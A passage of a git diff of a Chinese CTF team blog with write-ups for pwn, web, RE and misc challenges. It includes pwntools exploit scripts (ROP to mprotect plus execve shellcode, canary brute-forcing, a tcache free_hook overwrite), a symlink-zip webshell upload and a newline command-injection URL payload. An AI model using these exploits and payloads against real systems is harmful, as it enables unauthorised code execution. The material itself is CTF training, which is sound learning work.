:LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">200000</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">pop_rdi = <span class="number">0x40264f</span></span><br><span class="line">pop_rsi = <span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">mprotect = <span class="number">0x458B00</span></span><br><span class="line">read=<span class="number">0x457DC0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(<span class="number">0x4eA000</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x4eA000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)+p64(<span class="number">0x4eA000</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span>)</span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h3><p>有fork函数和栈溢出，所以直接爆破canary，虽然给了后门，但开了PIE，所以爆破后门地址最低二字节。</p>
+<p><strong>EXP</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;39.106.48.123&#x27;</span>,<span class="number">21251</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./&quot;)</span></span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      :LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span> + canary + p8(i)</span><br><span class="line">    sd(payload)</span><br><span class="line">    text = io.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;stack smashing&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">        canary += p8(i)  </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">printf(uu64(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span> + canary + p64(<span class="number">0</span>) + p16(<span class="number">0x5228</span>)</span><br><span class="line">sda(<span class="string">b&#x27;welcome\n&#x27;</span>, payload) </span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h3><p>随便上传一个文件，看到返回了如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">  <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们看到这里判断了上传文件类型application&#x2F;zip为zip文件，之后执行了exec(‘cd &#x2F;tmp &amp;&amp; unzip -o ‘ . $_FILES[“file”][“tmp_name”]);到tmp但是我们无法直接访问呢，所以我们通过制作软路由来绕过&#x2F;tmp链接到&#x2F;var&#x2F;www&#x2F;html然后把shell写进去即可；</p>
+<p>上传压缩包压缩包内容如下</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image066.gif" alt="图片"></p>
+<p>在R3ape1中写入一句话之后</p>
+<p>上传蚁剑连接shell到根目录获取flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image068.gif" alt="图片"></p>
+<h3 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h3><p>搜到相关漏洞文章:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11493">https://xz.aliyun.com/t/11493</a></p>
+<p>创建新用户</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image070.gif" alt="图片"></p>
+<p>在源码中找id</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image072.gif" alt="图片"></p>
+<p>新增配置</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image074.gif" alt="图片"></p>
+<p>反弹+监听+获取flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image076.gif" alt="图片"></p>
+<h3 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h3><p>&#x2F;?db&#x3D;&amp;table_2_dump&#x3D;%0a%20env</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image078.gif" alt="图片"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1577,231 +1777,6 @@
 <img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image016.gif" class="" title="图片">打开1.txt得到flag，
 
 <p>flag{2e55f884-ef01-4654-87b1-cc3111800085}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="nnnpc、commit、Eureka">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R3ape1团队笔记">
-      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | R3ape1团队笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/" class="post-title-link" itemprop="url">2022浙江省ctf初赛</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-09-20 21:16:00" itemprop="dateCreated datePublished" datetime="2022-09-20T21:16:00+08:00">2022-09-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-04-01 16:52:11" itemprop="dateModified" datetime="2023-04-01T16:52:11+08:00">2023-04-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/Eu21ka/pwn-exercises/tree/main/2022%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B">题目附件下载地址</a></p>
-</blockquote>
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>这道题是2.27下的一个tcache利用，因为有UAF，所以很容易的就可以泄露出堆地址。再利用tcache double free可以轻易释放堆块到unsorted bin中去，然后就可以泄露libc地址。然后通过修改fd指针，部署堆块到free hook上，并将其覆盖为onegadget，最后free触发onegadget获得shell。</p>
-<p><strong>EXP：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">x,file_name</span>):</span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;1.14.97.218&#x27;</span>,<span class="number">22785</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p,ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input your choice: &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,payload</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;input content: &#x27;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">elf,p,libc=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap=u64(p.recvline().replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap:&#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">1</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x7f</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-</span><br><span class="line">libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive(</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这周虚拟机崩了，之前写的脚本也就丢失了，所以就直接拿了别的师傅的exp，和我的攻击思路应该大差不差。</p>
-</blockquote>
-<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ManyCheck"><a href="#ManyCheck" class="headerlink" title="ManyCheck"></a>ManyCheck</h2><p>第一个检查是猜幸运数字，把程序拖进ida，通过字符串查询“First check”就可以立马定位到如下图所示的函数，然后易得出那个要猜的数字就是<code>77</code></p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204556151.png" class="" title="image-20220920204556151">
-
-<p>第二个检查根据问题敲敲计算器就可以计算出<code>55</code>和<code>49</code>两个答案，程序中的判断如下图所示</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204745404.png" class="" title="image-20220920204745404">
-
-<p>第三个检查依旧可以利用字符串查找来定位到关键函数，可看到下图中的11行就是判断</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204900834.png" class="" title="image-20220920204900834">
-
-<p>最后可以看到如下图所示的运算</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920205002693.png" class="" title="image-20220920205002693">
-
-<p>是循环移位，直接用python跑</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x=<span class="number">1718896489</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(x&gt;&gt;<span class="number">16</span>)+((x&amp;(<span class="number">2</span>**<span class="number">16</span>-<span class="number">1</span>))&lt;&lt;<span class="number">16</span>)</span><br><span class="line"><span class="number">1198089844</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="好怪哦"><a href="#好怪哦" class="headerlink" title="好怪哦"></a>好怪哦</h2><p>下载附件，发现是个损坏的压缩包，用winhex打开看看</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.gif" class="" title="图片">
-
-<p>发现是都翻转过的16进制，于是用随波逐流进行hex_str翻转</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.gif" class="" title="图片">
-
-<p>复制翻转修复好的16进制码，在winhex中还原出新的压缩包</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.gif" class="" title="图片">
-
-<p>保存好后打开压缩包，一张损坏的png图片，同样拉进winhex</p>
-<p>发现缺少png文件头，89504E47给它补上</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image008.gif" class="" title="图片">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image010.gif" class="" title="图片">
-
-<p>发现是一半的图片，修改高度得到flag</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image012.gif" class="" title="图片">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image014.gif" class="" title="图片">
-
-<p>DASCTF{f8b275b06baf4204fa62743eab5eca98}</p>
-<h2 id="神奇的棋盘"><a href="#神奇的棋盘" class="headerlink" title="神奇的棋盘"></a>神奇的棋盘</h2><p>下载附件</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image016.gif" class="" title="图片">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image018.gif" class="" title="图片">
-
-<p>看了眼附件，应该是棋盘加密，拿原先的棋盘对比一下</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image020.jpg" class="" title="图片">
-
-<p>对照替换</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image022.jpg" class="" title="图片">
-
-<p>到这里没什么思路了，去看看给的图片有没有隐藏信息，因为是png，所以先想到的是lsb隐写</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image024.jpg" class="" title="图片">
-
-<p>zsteg发现有段base32（stegsolve RGB0通道也可以解出），解出来是个key</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image026.jpg" class="" title="图片">
-
-<p>LastKey{Yusayyds}</p>
-<p>有了key直接随波逐流ADFGVX解密</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image028.jpg" class="" title="图片">
-
-<p>明文进行16进制转换得到flag</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image030.gif" class="" title="图片">
-
-<p>DASCTF{d859c41c530afc1c1ad94abd92f4baf8}</p>
-<h2 id="segmentFlow"><a href="#segmentFlow" class="headerlink" title="segmentFlow"></a>segmentFlow</h2><p>下载附件，八个加密文件</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image032.gif" class="" title="图片">
-
-<p>文件大小都相同，CRC32爆破</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image034.gif" class="" title="图片">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image036.gif" class="" title="图片">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image038.gif" class="" title="图片">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image040.gif" class="" title="图片">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image042.gif" class="" title="图片">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image044.gif" class="" title="图片">
-
-<p>password gZinflAte_BasE64，解压下来流量包，开始分析</p>
-<p>查看协议分级</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image046.gif" class="" title="图片">
-
-<p>追踪tcp流</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image048.gif" class="" title="图片">
-
-<p>在不同的流发现了不同的这样的数据，tshark提取数据</p>
-<p>tshark -r segmentFlow.pcapng -T fields -e urlencoded-form.value | sed ‘&#x2F;^\s*$&#x2F;d’ &gt; 1.txt</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image050.gif" class="" title="图片">
-
-<p>用notepad将,替换成换行符</p>
-<p><img src="E:/笔记/pwn/临时笔记/2022浙江省ctf初赛/clip_image052.gif" alt="图片"></p>
-<p>在这里发现了压缩包的16进制</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image054.gif" class="" title="图片">
-
-<p>将每一段提取出来拼接</p>
-<p>504B03041400000008006EAE86547BF6F39C2A0000002800000008000000666C61672E74787473710C760E71AB364B4D4C49344BB530314C364A4D4E32334E4A4E344834333731B2B0B04C32B0A80500504B01021F001400000008006EAE86547BF6F39C2A00000028000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800027E256ABD49D801027E256ABD49D8013254A060BD49D801504B050600000000010001005A000000500000000000</p>
-<p>转换为压缩包</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image056.gif" class="" title="图片">
-
-<p>得到flag<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image058.gif" class="" title="图片"></p>
-<p>DASCTF{6eada6e841c2ecb63bca0a6742889b08}</p>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.jpg" class="" title="img">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.jpg" class="" title="img">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.jpg" class="" title="img">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image007.png" class="" title="img">
-
-
-<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>读取规则</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image009.jpg" class="" title="img">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image011.jpg" class="" title="img">
-
-<p>注册时使用Admin盲猜登陆时后台有转小写的函数所以将admin的账号登录成功获得flag</p>
